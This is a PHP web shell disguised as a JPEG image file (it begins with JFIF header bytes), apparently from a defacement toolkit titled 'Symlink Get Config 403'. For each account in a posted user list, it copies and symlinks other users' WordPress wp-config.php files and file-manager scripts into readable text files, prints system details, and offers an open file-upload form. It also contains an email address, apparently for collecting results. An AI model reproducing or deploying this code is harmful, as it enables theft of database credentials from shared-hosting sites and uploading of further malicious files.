...
ÿØÿà JFIF  ` `  ÿþš<?php ?><html>
<head>
<title>Symlink Get Config 403 || 3rr0r Hun73r</title>
...
", $_POST["passwd"]);
    foreach ($passwd as $pwd) {
        ...
        copy('/' . $home . '/' . $user . '/public_html/filemanager/dialog.php', $user . 'RFM.txt');
        copy('/' . $home . '/' . $user . '/public_html/assets/filemanager/dialog.php', $user . 'RFM.txt');
        copy('/' . $home . '/' . $user . '/public_html/asset/filemanager/dialog.php', $user . 'RFM.txt');
        copy('/' . $home . '/' . $user . '/public_html/po-includes/js/filemanager/dialog.php', $user . 'RFM.txt');
        copy('/' . $home . '/' . $user . '/public_html/plugin/filemanager/dialog.php', $user . 'RFM.txt');
        copy('/' . $home . '/' . $user . '/public_html/plugins/filemanager/dialog.php', $user . 'RFM.txt');
        copy('/' . $home . '/' . $user . '/public_html/assets/plugins/filemanager/dialog.php', $user . 'RFM.txt');
        copy('/' . $home . '/' . $user . '/public_html/js/tinymce/plugins/filemanager/dialog.php', $user . 'RFM.txt');
        ...
        symlink('/' . $home . '/' . $user . '/public_html/filemanager/dialog.php', $user . 'RFM.txt');
        symlink('/' . $home . '/' . $user . '/public_html/assets/filemanager/dialog.php', $user . 'RFM.txt');
        symlink('/' . $home . '/' . $user . '/public_html/asset/filemanager/dialog.php', $user . 'RFM.txt');
        symlink('/' . $home . '/' . $user . '/public_html/po-includes/js/filemanager/dialog.php', $user . 'RFM.txt');
        symlink('/' . $home . '/' . $user . '/public_html/plugin/filemanager/dialog.php', $user . 'RFM.txt');
        symlink('/' . $home . '/' . $user . '/public_html/plugins/filemanager/dialog.php', $user . 'RFM.txt');
        symlink('/' . $home . '/' . $user . '/public_html/assets/plugins/filemanager/dialog.php', $user . 'RFM.txt');
        symlink('/' . $home . '/' . $user . '/public_html/js/tinymce/plugins/filemanager/dialog.php', $user . 'RFM.txt');
        ...
        copy('/var/www/wp/wp-config.php', 'WORDPRESS.txt');
        copy('/var/www/wordpress/wp-config.php', 'WORDPRESS.txt');
        copy('/var/www/blog/wp-config.php', 'WORDPRESS.txt');
        copy('/var/www/filemanager/dialog.php', 'RFM');
		copy('/var/www/html/filemanager/dialog.php', 'RFM');
		copy('/var/www/html/assets/filemanager/dialog.php', 'RFM');
		copy('/var/www/html/asset/filemanager/dialog.php', 'RFM');
		copy('/var/www/html/po-includes/js/filemanager/dialog.php', 'RFM');
		copy('/var/www/html/plugin/filemanager/dialog.php', 'RFM');
		copy('/var/www/html/plugins/filemanager/dialog.php', 'RFM');
		copy('/var/www/html/assets/plugins/filemanager/dialog.php', 'RFM');
		copy('/var/www/html/js/tinymce/plugins/filemanager/dialog.php', 'RFM');
        ...
        symlink('/var/www/wp/wp-config.php', 'WORDPRESS.txt');
        symlink('/var/www/wordpress/wp-config.php', 'WORDPRESS.txt');
        symlink('/var/www/blog/wp-config.php', 'WORDPRESS.txt');
        symlink('/var/www/filemanager/dialog.php', 'RFM');
		symlink('/var/www/html/filemanager/dialog.php', 'RFM');
		symlink('/var/www/html/assets/filemanager/dialog.php', 'RFM');
		symlink('/var/www/html/asset/filemanager/dialog.php', 'RFM');
		symlink('/var/www/html/po-includes/js/filemanager/dialog.php', 'RFM');
		symlink('/var/www/html/plugin/filemanager/dialog.php', 'RFM');
		symlink('/var/www/html/plugins/filemanager/dialog.php', 'RFM');
		symlink('/var/www/html/assets/plugins/filemanager/dialog.php', 'RFM');
		symlink('/var/www/html/js/tinymce/plugins/filemanager/dialog.php', 'RFM');
...
?>
<?php echo '<b><br><br>' . php_uname() . '<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if ($_POST['_upl'] == "Upload") {
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo '<b>Upload done :) </b><br><br>';
    } else {
        echo '<b>Upload Fai :( </b><br><br>';
    }
} ?>

<?php $kime = "jajami81@yahoo.com";
